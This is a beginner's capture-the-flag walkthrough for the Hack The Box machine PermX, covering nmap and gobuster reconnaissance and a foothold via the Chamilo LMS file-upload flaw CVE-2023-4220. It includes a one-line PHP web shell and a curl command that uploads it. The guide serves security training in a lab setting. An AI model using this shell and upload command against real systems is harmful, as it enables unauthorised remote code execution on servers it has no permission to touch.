# Beginners Guide To PermX

URL: https://app.hackthebox.com/machines/PermX

## Tools

- nmap
- gobuster

## Reconnaissance

### Scanning for open ports and services

- The first step in attempting to pwn any machine is to check for any open ports on that victim machine. A cli tool commonly used for this step is NMAP.

    - For more info on NMAP, checkout out: https://nmap.org/book/man.html

- With enough probing, you may discover the OS and a few interesting ports.

    - If you are unfamiliar with the ports discovered, checkout the following resource for identifying common ports and services: https://www.speedguide.net/ports.php?

    - Another resource to use when gathering intelligence, is to check CVE lists for ports and services identified on your victim machine, to learn about any documented volnurabilities: https://cve.mitre.org/cve/search_cve_list.html

#### NMAP Result

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-24 10:31 MDT
Nmap scan report for permx.htb (10.10.11.23)
Host is up (0.063s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.14 seconds
```

### Scanning subdomains

- From the nmap results, you should have identified a web page being hosted on the victim machine. Using a web browswer, navigate to the victim IP address on port 80 and you should see that it tries to resolve to permx.htb but it may not load correctly. Let's add this IP and domain to the host file on our attack machine.

#### /etc/hosts file

```
10.10.11.23 permx.htb
```

- For the next phase of reconnaissance, we should try scanning for subdomains. The tool I use for this is Gobuster, which has the following syntax:

    ```
    gobuster vhost -w /path/to/wordlist.txt -u http://victim_url.fun --append-domain
    ```

    - If you don't know where to get a wordlist for gobuster, checkout SecLists: https://github.com/danielmiessler/SecLists

- After letting gobuster scan for subdomains, you may find a new URL: http://lms.permx.htb. A login page for Chamilo.

## Establishing a foothold

Next, we should search the internet for known chamilo lms exploits. I found the following advisory (CVE-2023-4220): https://starlabs.sg/advisories/23/23-4220/

The bulletin states that Chamilo is PHP based, and confirms a vulnerability that allows an unauthenticated user to upload files to '/main/inc/lib/javascript/bigupload/files'. The bulletin also provides a blueprint for our attack in their proof of concept:

- We start by creating a simple PHP script on our attack machine that uses the system() function to execute commands passed to the 'cmd' parameter through the HTTP GET method. I'll name mine webshell.php

    #### webshell.php

    ```PHP
    <?php echo system($_GET["cmd"])?>
    ```

- Next, from our attack machine, we'll use curl to upload webshell.php

    #### Terminal

    ```bash
    curl -F 'bigUploadFile=@webshell.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
    ```

    - You should receive the following output: The file has successfully been uploaded.



# Additional resources

- SecLists: https://github.com/danielmiessler/SecLists
